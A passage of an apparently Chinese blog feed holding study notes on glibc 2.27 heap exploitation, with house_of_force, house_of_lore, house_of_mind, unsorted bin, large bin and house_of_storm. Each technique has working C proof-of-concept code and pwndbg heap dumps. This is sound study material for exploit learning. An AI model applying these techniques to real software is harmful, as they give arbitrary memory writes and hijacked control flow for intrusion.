class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建两个堆和一个伪造的堆,第一个堆的大小要是<code>0x?8</code>用来溢出到下一个堆的<code>size</code>位实现<code>off-by-null</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x41Allocated chunk | PREV_INUSEAddr: 0x405290Size: 0x501Top chunk | PREV_INUSEAddr: 0x405790Size: 0x20871<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd100x7fffffffdd10:0x00000000000001000x0000000000000100#prve_size    size0x7fffffffdd20:0x00007fffffffdd100x00007fffffffdd10#fd           bk0x7fffffffdd30:0x00007fffffffdd100x00007fffffffdd10#fd_nextsize  bknextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>inuse</code>为<code>0</code>,即表示上一个堆已经释放，再伪造<code>fake_chunk</code>的大小和第二个堆的<code>size</code>,绕过<code>prve_size == fd-&gt;size</code>的检查</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x41Allocated chunkAddr: 0x405290Size: 0x500Top chunk | PREV_INUSEAddr: 0x405790Size: 0x20871pwndbg&gt; x&#x2F;20gx 0x4052900x405290:0xffff8000004075800x00000000000005000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x00000000000000000x4052f0:0x00000000000000000x00000000000000000x405300:0x00000000000000000x00000000000000000x405310:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd100x7fffffffdd10:0x00000000000001000xffff8000004075800x7fffffffdd20:0x00007fffffffdd100x00007fffffffdd100x7fffffffdd30:0x00007fffffffdd100x00007fffffffdd10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>释放掉之后<code>fake_chunk</code>会和第二个堆合并，再次申请即可得到<code>fake_chunk</code>的地址</p><h3 id="house-of-force-top-chunk"><a href="#house-of-force-top-chunk" class="headerlink" title="house_of_force(top chunk)"></a>house_of_force(top chunk)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;intptr_t *p1 &#x3D; malloc(256);int real_size &#x3D; malloc_usable_size(p1);    intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;void *new_ptr &#x3D; malloc(evil_size);void* ctr_chunk &#x3D; malloc(100);strcpy(ctr_chunk, &quot;YEAH!!!&quot;);assert(ctr_chunk &#x3D;&#x3D; bss_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code></p><h3 id="house-of-lore-small-bin"><a href="#house-of-lore-small-bin" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;      void* fake_freelist[7][4];      intptr_t *victim &#x3D; malloc(0x100);  void *dummies[7];      for(int i&#x3D;0; i&lt;7; i++) dummies[i] &#x3D; malloc(0x100);  intptr_t *victim_chunk &#x3D; victim-2;  for(int i&#x3D;0; i&lt;6; i++) &#123;    fake_freelist[i][3] &#x3D; fake_freelist[i+1];  &#125;      fake_freelist[6][3] &#x3D; NULL;      stack_buffer_1[0] &#x3D; 0;  stack_buffer_1[1] &#x3D; 0;  stack_buffer_1[2] &#x3D; victim_chunk;  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;  stack_buffer_2[3] &#x3D; (intptr_t *)fake_freelist[0];    void *p5 &#x3D; malloc(1000);  for(int i&#x3D;0; i&lt;7; i++) free(dummies[i]);  free((void*)victim);  void *p2 &#x3D; malloc(1200);  victim[1] &#x3D; (intptr_t)stack_buffer_1;   for(int i&#x3D;0; i&lt;7; i++) malloc(0x100);  void *p3 &#x3D; malloc(0x100);  char *p4 &#x3D; malloc(0x100);      intptr_t sc &#x3D; (intptr_t)jackpot;    long offset &#x3D; (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8);       assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和<code>2.23</code>差不多，就是多了一个从<code>small bin</code>链表进入<code>tcache</code>的操作</p><p>先填满<code>tcache</code>并创建一个<code>small bin</code>，再创建一个堆防止合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (smallbins) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x7ffff7dcfda0bk: 0x7ffff7dcfda0Free chunk (tcache)Addr: 0x405360Size: 0x110fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x405470Size: 0x111fd: 0x405370Free chunk (tcache) | PREV_INUSEAddr: 0x405580Size: 0x111fd: 0x405480Free chunk (tcache) | PREV_INUSEAddr: 0x405690Size: 0x111fd: 0x405590Free chunk (tcache) | PREV_INUSEAddr: 0x4057a0Size: 0x111fd: 0x4056a0Free chunk (tcache) | PREV_INUSEAddr: 0x4058b0Size: 0x111fd: 0x4057b0Free chunk (tcache) | PREV_INUSEAddr: 0x4059c0Size: 0x111fd: 0x4058c0Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x405ec0Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x406380Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再在栈上创建一个伪造的<code>free list</code>，将<code>fake_freelist</code>伪造成每<code>0x20</code>就链接到下一个地址，最后<code>0x80</code>不做操作</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x7fffffffdd200x7fffffffdd20:0x00000000000000000x00000000000000000x7fffffffdd30:0x00000000004052500x00007fffffffdd000x7fffffffdd40:0x00007fffffffdda80x00000000000000f00x7fffffffdd50:0x00000000000000c20x000000000040190d0x7fffffffdd60:0x0000000000405ed00x0000000000405ae0pwndbg&gt; x&#x2F;10gx 0x7fffffffdd000x7fffffffdd00:0x00000000000000000x00000000000000000x7fffffffdd10:0x00007fffffffdd200x00007fffffffdc200x7fffffffdd20:0x00000000000000000x00000000000000000x7fffffffdd30:0x00000000004052500x00007fffffffdd000x7fffffffdd40:0x00007fffffffdda80x00000000000000f0...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改<code>small bin</code>中的堆的<code>bk</code>为伪造的<code>free list</code>地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110 [corrupted]FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;BK: 0x405250 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdc20 —▸ 0x7fffffffdc40 ◂— ...largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清空<code>tcache</code>再创建一个堆，使得伪造的堆逆向链入<code>tcache</code>，这样再次申请就可以在<code>tcache</code>中申请到栈地址了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x7fffffffdcb0 —▸ 0x7fffffffdc90 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdd10 —▸ 0x7fffffffdd30 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110 [corrupted]FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;BK: 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (smallbins) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x7ffff7dcfda0bk: 0x7fffffffdd20Allocated chunk | PREV_INUSEAddr: 0x405360Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405470Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405580Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405690Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x405ec0Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x406380Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-mind-fastbin-arena"><a href="#house-of-mind-fastbin-arena" class="headerlink" title="house_of_mind_fastbin(arena)"></a>house_of_mind_fastbin(arena)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;int HEAP_MAX_SIZE &#x3D; 0x4000000;int MAX_SIZE &#x3D; (128*1024) - 0x100;    uint8_t* fake_arena &#x3D; malloc(0x1000); uint8_t* target_loc &#x3D; fake_arena + 0x30;uint8_t* target_chunk &#x3D; (uint8_t*) fake_arena - 0x10;fake_arena[0x888] &#x3D; 0xFF;fake_arena[0x889] &#x3D; 0xFF; fake_arena[0x88a] &#x3D; 0xFF; uint64_t new_arena_value &#x3D; (((uint64_t) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - 1);uint64_t* fake_heap_info &#x3D; (uint64_t*) new_arena_value;uint64_t* user_mem &#x3D; malloc(MAX_SIZE);    while((long long)user_mem &lt; new_arena_value)&#123;user_mem &#x3D; malloc(MAX_SIZE);&#125;uint64_t* fastbin_chunk &#x3D; malloc(0x50); uint64_t* chunk_ptr &#x3D; fastbin_chunk - 2;     uint64_t* tcache_chunks[7];for(int i &#x3D; 0; i &lt; 7; i++)&#123;tcache_chunks[i] &#x3D; malloc(0x50);&#125;for(int i &#x3D; 0; i &lt; 7; i++)&#123;free(tcache_chunks[i]);&#125;fake_heap_info[0] &#x3D; (uint64_t) fake_arena;     chunk_ptr[1] &#x3D; 0x60 | 0x4;     free(fastbin_chunk);     assert(*((unsigned long *) (target_loc)) !&#x3D; 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过伪造<code>arena</code>的<code>HEAP_MAX_SIZE、MAX_SIZE、system_mem</code>并申请到<code>fast bin</code>再释放来将一个<code>chunk</code>的内容为一个很大的值</p><p>其中需要绕过一个检查，即申请的内存不能大于<code>system_men</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (chunksize_nomask (victim) &lt;&#x3D; 2 * SIZE_SZ, 0)              || __builtin_expect (chunksize_nomask (victim)   &gt; av-&gt;system_mem, 0))            malloc_printerr (&quot;malloc(): memory corruption&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0x1000</code>的堆用于伪造<code>arena</code>，由于没有刷新缓冲流所以有一个多出来的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x405660Size: 0x1011Top chunk | PREV_INUSEAddr: 0x406670Size: 0x1f991<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>0x888</code>的位置设置<code>system_men</code>大小为<code>0xFFFFFFFF</code></p><pre class="line-numbers language-none"><code class="language-none">0x405ef0:0x00000000000000000x0000000000ffffff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以<code>MAX_SIZE</code>的大小创建堆直至满足<code>user_mem &lt; new_arena_value</code>的最多数量，由于<code>mmap_threshold=0x20000</code>所以创建的堆大小为<code>0x1ff00</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x405660Size: 0x1011Allocated chunk | PREV_INUSEAddr: 0x406670Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x426580Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x446490Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x4663a0Size: 0x1ff11...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>创建一个<code>fast bin</code>，将<code>fake_heap_info</code>的<code>ar_ptr</code>给设置成<code>fake_arena</code>并设置<code>fast bin</code>的<code>non_main_arena</code>标志位，再全部释放之后即可根据<code>heap_info</code>的<code>ar_ptr</code>找到我们的假chunk并更改chunk的内容达到目的</p><h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;volatile unsigned long stack_var&#x3D;0;unsigned long *p&#x3D;malloc(0x410);malloc(500);free(p);    p[1]&#x3D;(unsigned long)(&amp;stack_var-2);    malloc(0x410);    assert(stack_var !&#x3D; 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code>，大小大于<code>tcache</code></p><h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt; int main()&#123;    setbuf(stdout, NULL);    unsigned long stack_var1 &#x3D; 0;    unsigned long stack_var2 &#x3D; 0;    unsigned long *p1 &#x3D; malloc(0x420);    malloc(0x20);    unsigned long *p2 &#x3D; malloc(0x500);    malloc(0x20);    unsigned long *p3 &#x3D; malloc(0x500);    malloc(0x20);     free(p1);    free(p2);    malloc(0x90);    free(p3);    p2[-1] &#x3D; 0x3f1;    p2[0] &#x3D; 0;    p2[2] &#x3D; 0;    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);    malloc(0x90);     assert(stack_var1 !&#x3D; 0);    assert(stack_var2 !&#x3D; 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用进入<code>large bin</code>插入的堆大小大于上一个堆的大小时会将上一个堆的<code>bk</code>和<code>bk_nextsize</code>的堆中写入当前堆的地址来实现改栈上地址为堆地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">while ((unsigned long) size &lt; chunksize_nomask (fwd))                       &#123;                         fwd &#x3D; fwd-&gt;fd_nextsize;  assert (chunk_main_arena (fwd));                       &#125;                     if ((unsigned long) size  &#x3D;&#x3D; (unsigned long) chunksize_nomask (fwd))                       &#x2F;* Always insert in the second position.  *&#x2F;                       fwd &#x3D; fwd-&gt;fd;                     else                       &#123;                         victim-&gt;fd_nextsize &#x3D; fwd;                         victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                         fwd-&gt;bk_nextsize &#x3D; victim;                         victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                       &#125;bck &#x3D; fwd-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建一个属于<code>small bin</code>的堆和两个属于<code>large bin</code>的堆，每个堆创建之后都要创建一个堆防止合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405680Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x4056b0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405bc0Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x405bf0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x406100Size: 0x31Top chunk | PREV_INUSEAddr: 0x406130Size: 0x1fed1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放两个堆，再创建一个小于第一个堆大小的堆，使得第一个堆还在<code>unsorted bin</code>但第二个堆进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4052f0smallbinsemptylargebins0x500: 0x4056b0 —▸ 0x7ffff7dd00d0 (main_arena+1168) ◂— 0x4056b0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放第三个堆进入<code>unsorted bin</code>，改第二个堆大小小于第三个堆并改<code>bk</code>和<code>bk_nextsize</code>为<code>stack_var1 - 0x10</code>，<code>stack_var2 - 0x20</code>,此时&#96;&#96;P2 -&gt; bk -&gt; fd &#x3D; stack_var1_addr  P2 -&gt; bk_nextsize -&gt; fd_nextsize &#x3D; stack_var2_addr&#96;</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405bf0 —▸ 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405bf0smallbinsemptylargebins0x500 [corrupted]FD: 0x4056b0 ◂— 0x0BK: 0x4056b0 —▸ 0x7fffffffdd60 —▸ 0x405c00 ◂— 0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4056b00x4056b0:0x00000000000000000x00000000000003f10x4056c0:0x00000000000000000x00007fffffffdd600x4056d0:0x00000000000000000x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次创建一个小的堆时第三个堆会进入<code>large bin</code>，此时会进行上面分析的操作使得第二个堆的<code>bk</code>和<code>bk_nextsize</code>中的栈地址的内容变成第三个堆地址</p><h3 id="house-of-storm-largebin-unsortedbin"><a href="#house-of-storm-largebin-unsortedbin" class="headerlink" title="house_of_storm(largebin + unsortedbin)"></a>house_of_storm(largebin + unsortedbin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x60];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);&#125;int get_shift_amount(char* pointer)&#123;int shift_amount &#x3D; 0;long long ptr &#x3D; (long long)pointer;while(ptr &gt; 0x20)&#123;ptr &#x3D; ptr &gt;&gt; 8; shift_amount +&#x3D; 1; &#125;return shift_amount - 1; &#125;int main()&#123;init();    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;int* tcaches[7];unsorted_bin &#x3D; malloc ( 0x4e8 );      malloc ( 0x18 ); int shift_amount &#x3D; get_shift_amount(unsorted_bin);    size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);if(alloc_size &lt; 0x10)&#123;printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);puts(&quot;Chunk size is too small&quot;);exit(1);&#125;alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10;     if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;    return 1;    &#125;if(alloc_size &lt; 0x410)&#123;for(int i &#x3D; 0; i &lt; 7; i++)&#123;tcaches[i] &#x3D; malloc(alloc_size);&#125;for(int i &#x3D; 0; i &lt; 7; i++)&#123;free(tcaches[i]);&#125;&#125;else&#123;puts(&quot;Not filling up the TCache&quot;);&#125;large_bin  &#x3D;  malloc ( 0x4d8 ); malloc ( 0x18 );free ( large_bin ); free ( unsorted_bin );unsorted_bin &#x3D; malloc(0x4e8);free(unsorted_bin);fake_chunk &#x3D; target - 0x10;((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; (( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ; (( size_t *) large_bin)[3] &#x3D; (size_t)fake_chunk - 0x18 - shift_amount; ptr &#x3D; calloc(alloc_size, 1);strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);printf(&quot;String after %s\n&quot;, target);printf(&quot;Fake chunk ptr: %p\n&quot;, ptr);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原理同<code>2.23</code>，<code>large bin</code>的应用同<code>2.27 large bin attack</code>，在<code>large bin attack</code>基础上利用<code>unsorted bin</code>实现任意地址分配</p>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《CSAPP》阅读笔记（持续更新）</title>
      <link href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/"/>
      <url>/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/</url>
      
